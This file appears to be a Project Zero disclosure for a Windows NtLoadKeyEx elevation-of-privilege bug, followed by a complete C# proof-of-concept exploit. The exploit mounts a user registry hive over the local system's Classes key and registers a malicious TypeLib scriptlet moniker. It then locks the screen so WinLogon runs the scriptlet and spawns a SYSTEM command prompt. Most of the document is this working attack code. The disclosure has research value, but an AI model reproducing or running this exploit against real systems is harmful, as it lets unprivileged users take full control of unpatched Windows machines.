/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=865

Windows: NtLoadKeyEx User Hive Attachment Point EoP
Platform: Windows 10 10586 (32/64) and 8.1 Update 2, not tested Windows 7
Class: Elevation of Privilege

Summary:
The NtLoadKeyEx system call allows an unprivileged user to load registry hives outside of the \Registry\A hidden attachment point which can be used to elevate privileges. 

Description:

Windows Vista and above support loading per-user registry hives. Normally calling NtLoadKeyEx would require Backup/Restore privileges to do this making it useless for the average user.. However per-user hives are permitted from a normal user. When calling the Win32 API RegLoadAppKey the hive is loaded under \Registry\A which is a hidden attachment key and doesn’t provide any obvious benefit from an EoP perspective (especially as the root name is a random GUID). However it turns out that you can load the per-user hive to any attachment point such as \Registry\User or \Registry\Machine. Interestingly this works even as a sandboxed user, so it would be an escape out of EPM/Edge/Bits of Chrome etc.

So how can we exploit this? The simplest way I’ve found is to register the hive as the local system "Classes" key. This isn’t registered by default, however a quick inspection indicates that local system does indeed refer to this key when trying to access COM registration information. So by putting an appropriate registration in \Registry\User\S-1-5-18_Classes it will be loaded as a local system component and privileged execution is achieved.

Proof of Concept:

I’ve provided a PoC as a C# source code file. You need to compile it first. It uses the issue with NtLoadKeyEx to map a custom hive over the local system’s Classes key. It then registers a type library which is loaded when WinLogon is signaled. I signal WinLogon by locking the screen. It abuses the fact that registered type library paths when passed to LoadTypeLib can be a COM moniker. So I register a COM scriptlet moniker which will be bound when LoadTypeLib parses it, this causes a local scriptlet file to be executed which respawns the original binary to spawn an interactive command prompt. By doing it this way it works on 32 bit and 64 bit without any changes.

Note that it doesn’t need to use the Lock Screen, just this was the first technique I found. Many system services are loading data out of the registry hive, it would just be a case of finding something which could be trivially triggered by the application. In any case imo the bug is the behaviour of NtLoadKeyEx, not how I exploit it.

1) Compile the C# source code file.
2) Execute the PoC executable as a normal user.
3) The PoC should lock the screen. You’ll need to unlock again (do not log out).
4) If successful a system level command prompt should be available on the user’s desktop when you unlock.

Expected Result:
You can’t create a per-user hive outside of the hidden attachment point.

Observed Result:
Well obviously you can.
*/

using Microsoft.Win32;
using Microsoft.Win32.SafeHandles;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Poc_NtLoadKeyEx_EoP
{
  class Program
  {
    [Flags]
    public enum AttributeFlags : uint
    {
      None = 0,
      Inherit = 0x00000002,
      Permanent = 0x00000010,
      Exclusive = 0x00000020,
      CaseInsensitive = 0x00000040,
      OpenIf = 0x00000080,
      OpenLink = 0x00000100,
      KernelHandle = 0x00000200,
      ForceAccessCheck = 0x00000400,
      IgnoreImpersonatedDevicemap = 0x00000800,
      DontReparse = 0x00001000,
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public sealed class UnicodeString
    {
      ushort Length;
      ushort MaximumLength;
      [MarshalAs(UnmanagedType.LPWStr)]
      string Buffer;

      public UnicodeString(string str)
      {
        Length = (ushort)(str.Length * 2);
        MaximumLength = (ushort)((str.Length * 2) + 1);
        Buffer = str;
      }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public sealed class ObjectAttributes : IDisposable
    {
      int Length;
      IntPtr RootDirectory;
      IntPtr ObjectName;
      AttributeFlags Attributes;
      IntPtr SecurityDescriptor;
      IntPtr SecurityQualityOfService;

      private static IntPtr AllocStruct(object s)
      {
        int size = Marshal.SizeOf(s);
        IntPtr ret = Marshal.AllocHGlobal(size);
        Marshal.StructureToPtr(s, ret, false);
        return ret;
      }

      private static void FreeStruct(ref IntPtr p, Type struct_type)
      {
        Marshal.DestroyStructure(p, struct_type);
        Marshal.FreeHGlobal(p);
        p = IntPtr.Zero;
      }

      public ObjectAttributes(string object_name)
      {
        Length = Marshal.SizeOf(this);
        if (object_name != null)
        {
          ObjectName = AllocStruct(new UnicodeString(object_name));
        }
        Attributes = AttributeFlags.None;
      }

      public void Dispose()
      {
        if (ObjectName != IntPtr.Zero)
        {
          FreeStruct(ref ObjectName, typeof(UnicodeString));
        }
        GC.SuppressFinalize(this);
      }

      ~ObjectAttributes()
      {
        Dispose();
      }
    }

    [Flags]
    public enum LoadKeyFlags
    {
      None = 0,
      AppKey = 0x10,
      Exclusive = 0x20,
      Unknown800 = 0x800,
    }

    [Flags]
    public enum GenericAccessRights : uint
    {
      None = 0,
      GenericRead = 0x80000000,
      GenericWrite = 0x40000000,
      GenericExecute = 0x20000000,
      GenericAll = 0x10000000,
      Delete = 0x00010000,
      ReadControl = 0x00020000,
      WriteDac = 0x00040000,
      WriteOwner = 0x00080000,
      Synchronize = 0x00100000,
      MaximumAllowed = 0x02000000,
    }

    public class NtException : ExternalException
    {
      [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
      private static extern IntPtr GetModuleHandle(string modulename);

      [Flags]
      enum FormatFlags
      {
        AllocateBuffer = 0x00000100,
        FromHModule = 0x00000800,
        FromSystem = 0x00001000,
        IgnoreInserts = 0x00000200
      }

      [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
      private static extern int FormatMessage(
        FormatFlags dwFlags,
        IntPtr lpSource,
        int dwMessageId,
        int dwLanguageId,
        out IntPtr lpBuffer,
        int nSize,
        IntPtr Arguments
      );

      [DllImport("kernel32.dll")]
      private static extern IntPtr LocalFree(IntPtr p);

      private static string StatusToString(int status)
      {
        IntPtr buffer = IntPtr.Zero;
        try
        {
          if (FormatMessage(FormatFlags.AllocateBuffer | FormatFlags.FromHModule | FormatFlags.FromSystem | FormatFlags.IgnoreInserts,
              GetModuleHandle("ntdll.dll"), status, 0, out buffer, 0, IntPtr.Zero) > 0)
          {
            return Marshal.PtrToStringUni(buffer);
          }
        }
        finally
        {
          if (buffer != IntPtr.Zero)
          {
            LocalFree(buffer);
          }
        }
        return String.Format("Unknown Error: 0x{0:X08}", status);
      }

      public NtException(int status) : base(StatusToString(status))
      {
      }
    }

    public static void StatusToNtException(int status)
    {
      if (status < 0)
      {
        throw new NtException(status);
      }
    }

    [DllImport("ntdll.dll")]
    public static extern int NtLoadKeyEx(ObjectAttributes DestinationName, ObjectAttributes FileName, LoadKeyFlags Flags,
        IntPtr TrustKeyHandle, IntPtr EventHandle, GenericAccessRights DesiredAccess, out SafeRegistryHandle KeyHandle, int Unused);

    static string scriptlet_code = @"<?xml version='1.0'?>
<package>
<component id='giffile'>
<registration
  description='Dummy'
  progid='giffile'
  version='1.00'
  remotable='True'>

</registration>
<script language='JScript'>
<![CDATA[
  new ActiveXObject('Wscript.Shell').exec('%CMDLINE%');
]]>
</script>
</component>
</package>
";

    public enum TokenInformationClass
    {
      TokenSessionId = 12
    }

    [DllImport("ntdll.dll")]
    public static extern int NtClose(IntPtr handle);

    [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
    public static extern int NtOpenProcessTokenEx(
          IntPtr ProcessHandle,
          GenericAccessRights DesiredAccess,
          AttributeFlags HandleAttributes,
          out IntPtr TokenHandle);

    public sealed class SafeKernelObjectHandle
  : SafeHandleZeroOrMinusOneIsInvalid
    {
      public SafeKernelObjectHandle()
        : base(true)
      {
      }

      public SafeKernelObjectHandle(IntPtr handle, bool owns_handle)
        : base(owns_handle)
      {
        SetHandle(handle);
      }

      protected override bool ReleaseHandle()
      {
        if (!IsInvalid)
        {
          NtClose(this.handle);
          this.handle = IntPtr.Zero;
          return true;
        }
        return false;
      }
    }

    public enum TokenType
    {
      Primary = 1,
      Impersonation = 2
    }

    [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
    public static extern int NtDuplicateToken(
    IntPtr ExistingTokenHandle,
    GenericAccessRights DesiredAccess,
    ObjectAttributes ObjectAttributes,
    bool EffectiveOnly,
    TokenType TokenType,
    out IntPtr NewTokenHandle
    );

    public static SafeKernelObjectHandle DuplicateToken(SafeKernelObjectHandle existing_token)
    {
      IntPtr new_token;
      
      using (ObjectAttributes obja = new ObjectAttributes(null))
      {
        StatusToNtException(NtDuplicateToken(existing_token.DangerousGetHandle(),
          GenericAccessRights.MaximumAllowed, obja, false, TokenType.Primary, out new_token));
        return new SafeKernelObjectHandle(new_token, true);
      }
    }

    public static SafeKernelObjectHandle OpenProcessToken()
    {
      IntPtr new_token;
      StatusToNtException(NtOpenProcessTokenEx(new IntPtr(-1),
        GenericAccessRights.MaximumAllowed, AttributeFlags.None, out new_token));
      using (SafeKernelObjectHandle ret = new SafeKernelObjectHandle(new_token, true))
      {
        return DuplicateToken(ret);
      }
    }

    [DllImport("ntdll.dll")]
    public static extern int NtSetInformationToken(
      SafeKernelObjectHandle TokenHandle,
      TokenInformationClass TokenInformationClass,
      byte[] TokenInformation,
      int TokenInformationLength);

    public static void SetTokenSessionId(SafeKernelObjectHandle token, int session_id)
    {
      byte[] buffer = BitConverter.GetBytes(session_id);      
      NtSetInformationToken(token, TokenInformationClass.TokenSessionId, 
        buffer, buffer.Length);
    }

    static Tuple<EventWaitHandle, EventWaitHandle> GetEvents()
    {
      EventWaitHandle user_ev = new EventWaitHandle(false, EventResetMode.AutoReset, @"Global\ntloadkey_event_user_wait");
      EventWaitHandle sys_ev = new EventWaitHandle(false, EventResetMode.AutoReset, @"Global\ntloadkey_event_sys_wait");

      return new Tuple<EventWaitHandle, EventWaitHandle>(user_ev, sys_ev);
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
      public Int32 cb;
      public string lpReserved;
      public string lpDesktop;
      public string lpTitle;
      public Int32 dwX;
      public Int32 dwY;
      public Int32 dwXSize;
      public Int32 dwYSize;
      public Int32 dwXCountChars;
      public Int32 dwYCountChars;
      public Int32 dwFillAttribute;
      public Int32 dwFlags;
      public Int16 wShowWindow;
      public Int16 cbReserved2;
      public IntPtr lpReserved2;
      public IntPtr hStdInput;
      public IntPtr hStdOutput;
      public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
      public IntPtr hProcess;
      public IntPtr hThread;
      public int dwProcessId;
      public int dwThreadId;
    }

    enum CreateProcessFlags
    {
      CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
      CREATE_DEFAULT_ERROR_MODE = 0x04000000,
      CREATE_NEW_CONSOLE = 0x00000010,
      CREATE_NEW_PROCESS_GROUP = 0x00000200,
      CREATE_NO_WINDOW = 0x08000000,
      CREATE_PROTECTED_PROCESS = 0x00040000,
      CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
      CREATE_SEPARATE_WOW_VDM = 0x00000800,
      CREATE_SHARED_WOW_VDM = 0x00001000,
      CREATE_SUSPENDED = 0x00000004,
      CREATE_UNICODE_ENVIRONMENT = 0x00000400,
      DEBUG_ONLY_THIS_PROCESS = 0x00000002,
      DEBUG_PROCESS = 0x00000001,
      DETACHED_PROCESS = 0x00000008,
      EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
      INHERIT_PARENT_AFFINITY = 0x00010000
    }

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool CreateProcessAsUser(
      IntPtr hToken,
      string lpApplicationName,
      string lpCommandLine,
      IntPtr lpProcessAttributes,
      IntPtr lpThreadAttributes,
      bool bInheritHandles,
      CreateProcessFlags dwCreationFlags,
      IntPtr lpEnvironment,
      string lpCurrentDirectory,
      ref STARTUPINFO lpStartupInfo,
      out PROCESS_INFORMATION lpProcessInformation);

    static void SpawnInteractiveCmd(int sessionid)
    {
      Tuple<EventWaitHandle, EventWaitHandle> events = GetEvents();
      Console.WriteLine("Got Events");
      events.Item1.Set();
      events.Item2.WaitOne();
      SafeKernelObjectHandle token = OpenProcessToken();
      SetTokenSessionId(token, sessionid);

      STARTUPINFO startInfo = new STARTUPINFO();
      startInfo.cb = Marshal.SizeOf(startInfo);
      PROCESS_INFORMATION procInfo;

      CreateProcessAsUser(token.DangerousGetHandle(), null, "cmd.exe", 
        IntPtr.Zero, IntPtr.Zero, false, CreateProcessFlags.CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref startInfo, out procInfo);
    }

    [DllImport("user32.dll")]
    static extern bool LockWorkStation();

    static void DoExploit()
    {
      Console.WriteLine("{0}", Assembly.GetCallingAssembly().Location);
      Tuple<EventWaitHandle, EventWaitHandle> events = GetEvents();

      string cmdline = String.Format(@"""{0}"" {1}",
        Assembly.GetCallingAssembly().Location.Replace('\\', '/'), Process.GetCurrentProcess().SessionId);
      string scriptlet_path = Path.GetFullPath("dummy.sct");
      File.WriteAllText(scriptlet_path, scriptlet_code.Replace("%CMDLINE%", cmdline), Encoding.ASCII);
      Console.WriteLine("{0}", scriptlet_path);
      string scriptlet_url = "script:" + new Uri(scriptlet_path).AbsoluteUri;
      Console.WriteLine("{0}", scriptlet_url);
      string reg_name = @"\Registry\User\S-1-5-18_Classes";
      string path = @"\??\" + Path.GetFullPath("dummy.hiv");
      File.Delete("dummy.hiv");
      ObjectAttributes KeyName = new ObjectAttributes(reg_name);
      ObjectAttributes FileName = new ObjectAttributes(path);
      SafeRegistryHandle keyHandle;

      StatusToNtException(NtLoadKeyEx(KeyName,
        FileName, LoadKeyFlags.AppKey, IntPtr.Zero,
        IntPtr.Zero, GenericAccessRights.GenericAll, out keyHandle, 0));

      RegistryKey key = RegistryKey.FromHandle(keyHandle);
      RegistryKey typelib_key = key.CreateSubKey("TypeLib").CreateSubKey("{D597DEED-5B9F-11D1-8DD2-00AA004ABD5E}").CreateSubKey("2.0").CreateSubKey("0");
      typelib_key.CreateSubKey("win32").SetValue(null, scriptlet_url);
      typelib_key.CreateSubKey("win64").SetValue(null, scriptlet_url);

      Console.WriteLine("Handle: {0} - Key {1} - Path {2}", keyHandle.DangerousGetHandle(), reg_name, path);
      Console.WriteLine("Lock screen and re-login.");
      LockWorkStation();
      events.Item1.WaitOne();
      typelib_key.DeleteSubKey("win32");
      typelib_key.DeleteSubKey("win64");
      File.Delete(scriptlet_path);
      typelib_key.Close();
      key.Close();      
      events.Item2.Set();
    }

    static void Main(string[] args)
    {
      try
      {
        if (args.Length > 0)
        {
          SpawnInteractiveCmd(int.Parse(args[0]));
        }
        else
        {
          DoExploit();
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    }
  }
}